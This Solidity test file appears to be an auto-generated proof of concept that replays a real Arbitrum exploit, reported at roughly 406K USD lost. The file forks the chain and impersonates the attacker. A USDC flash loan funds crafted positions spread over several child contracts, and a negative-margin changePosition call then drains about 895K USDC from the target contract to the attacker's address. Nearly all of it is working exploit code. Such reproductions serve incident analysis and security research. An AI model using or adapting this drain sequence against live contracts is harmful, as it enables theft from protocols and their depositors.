// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "./Base.sol";

// @KeyInfo - Total Lost : 406.22K USD
// Attacker : 0xbf6ec059f519b668a309e1b6ecb9a8ea62832d95
// Attack Contract : N/A
// Vulnerable Contract : N/A
// Attack Tx : 0xe1e6aa5332deaf0fa0a3584113c17bedc906148730cbbc73efae16306121687b
// Block : 419829771
// Chain : Arbitrum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : attacker_profit_reproduction
// Reproduced Value : 395.15K USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.ZERO;
    uint256 constant FORK_BLOCK = 419829770;
    uint256 constant TX_TIMESTAMP = 1768033835;
    uint256 constant TX_BLOCK_NUMBER = 419829771;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        attack = new OurAttack();
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), _expectedAttackChild(attack));
    }

    function _expectedAttackChild(OurAttack attack) internal view returns (address) {
        return address(attack.attackChild());
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.A_625E77_B4CD, address(0), Addresses.USDC_5CC8, "USDC", 500250000000);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDC_5CC8, "USDC", 394742852305);
    }
}

contract OurAttack {
    AttackChild public attackChild;

    constructor() payable {
        attackChild = new AttackChild();
        require(address(attackChild) == 0x348DF930E825Da25552D8B3dc44e871c67846CB5, "unexpected attack child");
    }

    function attack() public payable {
        attackChild.run();
        uint256 finalUsdcBalance = IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attacker_eoa, finalUsdcBalance);
    }

    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
    }
}

contract AttackChild {
    constructor() payable {
        _deployAttackChild();
    }

    receive() external payable {}

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        payable
        returns (bool)
    {
        asset;
        amount;
        premium;
        initiator;
        params;
        if (!flashCallbackDone) flashCallback();
        return true;
    }

    function run() external payable {
        requestFlashLoan();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function execOp() external payable {
        if (!flashCallbackDone) flashCallback();
    }

    bool private flashCallbackDone;

    function flashCallback() internal {
        flashCallbackDone = true;
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).updateFunding();
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        uint256 firstPositionUsdc = 1000000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_6635, firstPositionUsdc);
        AttackChild_3(payable(Addresses.attack_child_6635)).attackChildCb2();

        uint256 zeroPoolUsdc = 2000000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child, zeroPoolUsdc);
        AttackChild_1(payable(Addresses.attack_child)).attackChildCb();
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();

        uint256 smallPositionUsdc = 500000000;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_child_7BEB, smallPositionUsdc);
        AttackChild_2(payable(Addresses.attack_child_7BEB)).openSmallPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));

        uint256 mainPositionAllowance = 496500000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, mainPositionAllowance);
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(-68000000000000000000), int256(mainPositionAllowance), int256(0));
        AttackChild_3(payable(Addresses.attack_child_6635)).attackChildCb3();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));

        uint256 repaymentAllowance = 500250000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_794A61_14AD, repaymentAllowance);
    }

    function requestFlashLoan() internal {
        IContract_794A61_14AD(Addresses.A_794A61_14AD)
            .flashLoanSimple(address(this), Addresses.USDC_5CC8, 500000000000, hex"", 0);
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, 0);
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 returnedUsdc = 394742852305;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.attack_path_entry, returnedUsdc);
    }

    function _deployAttackChild() public {
        AttackChild_3 attackChild_3 = new AttackChild_3();
        require(address(attackChild_3) == Addresses.attack_child_6635, "unexpected attack child");
        attackChild_3.observeSetup();
        AttackChild_1 attackChild_1 = new AttackChild_1();
        require(address(attackChild_1) == Addresses.attack_child, "unexpected attack child");
        attackChild_1.observeSetup();
        AttackChild_2 attackChild_2 = new AttackChild_2();
        require(address(attackChild_2) == Addresses.attack_child_7BEB, "unexpected attack child");
        attackChild_2.observeSetup();
    }
}

contract AttackChild_1 {
    receive() external payable {}

    function zeroPool() external payable {
        executeZeroPool();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function attackChildCb() external payable {
        executeZeroPool();
        return;
    }

    function executeZeroPool() internal {
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 zeroPoolAllowance = 2000000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, zeroPoolAllowance);
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(324678582642240534), int256(zeroPoolAllowance), int256(0));
    }

    function observeSetup() public {}
}

contract AttackChild_2 {
    receive() external payable {}

    fallback() external payable {
        if (msg.data.length == 0) return;
        if (msg.sig == 0x7ef540b0) {
            openSmallPosition();
            return;
        }
    }

    function openSmallPosition() public payable {
        executeSmallPosition();
        return;
    }

    function executeSmallPosition() internal {
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 smallAllowance = 500000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, smallAllowance);
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(1000000000000000), int256(smallAllowance), int256(0));
    }

    function observeSetup() public {}
}

contract AttackChild_3 {
    receive() external payable {}

    function openPosition() external payable {
        executeOpenPosition();
        return;
    }

    function drain() external payable {
        executeDrain();
        return;
    }

    fallback() external payable {
        if (msg.data.length == 0) return;
    }

    function attackChildCb2() external payable {
        executeOpenPosition();
        return;
    }

    function attackChildCb3() external payable {
        executeDrain();
        return;
    }

    function executeOpenPosition() internal {
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).longPosition();
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 openAllowance = 1000000000;
        IERC20Like(Addresses.USDC_5CC8).approve(Addresses.A_F7CA73_80BC, openAllowance);
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC)
            .changePosition(int256(100000000000000000), int256(openAllowance), int256(0));
    }

    function executeDrain() internal {
        IERC20Like(Addresses.USDC_5CC8).balanceOf(Addresses.A_F7CA73_80BC);
        IContract_F7CA73_80BC(Addresses.A_F7CA73_80BC).changePosition(int256(0), int256(-894992852305), int256(0));
        IERC20Like(Addresses.USDC_5CC8).balanceOf(address(this));
        uint256 drainedUsdc = 894992852305;
        IERC20Like(Addresses.USDC_5CC8).transfer(Addresses.created_attack_contract_6CB5, drainedUsdc);
    }

    function observeSetup() public {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant USDC = 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8;
    address internal constant attack_path_entry = 0x21EdA2e3ad975Fde9c81769E15Ed8e1532eB08a4;
    address internal constant created_attack_contract_6CB5 = 0x348DF930E825Da25552D8B3dc44e871c67846CB5;
    address internal constant A_625E77_B4CD = 0x625E7708f30cA75bfd92586e17077590C60eb4cD;
    address internal constant A_6749D7_6707 = 0x6749D795bb40Ddf00a953f618CEddA7440216707;
    address internal constant A_794A61_14AD = 0x794a61358D6845594F94dc1DB02A252b5b4814aD;
    address internal constant WETH = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address internal constant RKA = 0x8b194bEae1d3e0788A1a35173978001ACDFba668;
    address internal constant attack_child = 0x8c6be2E20306dD1eC40A7E76f40310943953bA7f;
    address internal constant A_B309BF_AB83 = 0xb309bf4e2747B885D8C3ee2e078E6EAADFcdaB83;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant attacker_eoa = 0xbF6EC059F519B668a309e1b6eCb9a8eA62832d95;
    address internal constant A_C31E54_A443 = 0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
    address internal constant attack_child_7BEB = 0xEa09EA354009818776D41F8E2a9DCDfC9C4e7bEb;
    address internal constant attack_child_6635 = 0xf1b426708D6ECf02274A789Bbc10A94a1B5A6635;
    address internal constant A_F7CA73_80BC = 0xF7CA7384cc6619866749955065f17beDD3ED80bC;
    address internal constant USDC_5CC8 = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface IContract_794A61_14AD {
    function flashLoanSimple(address, address, uint256, bytes calldata, uint16) external;
}

interface IContract_F7CA73_80BC {
    function changePosition(int256, int256, int256) external;
    function longPosition() external view;
    function updateFunding() external;
}
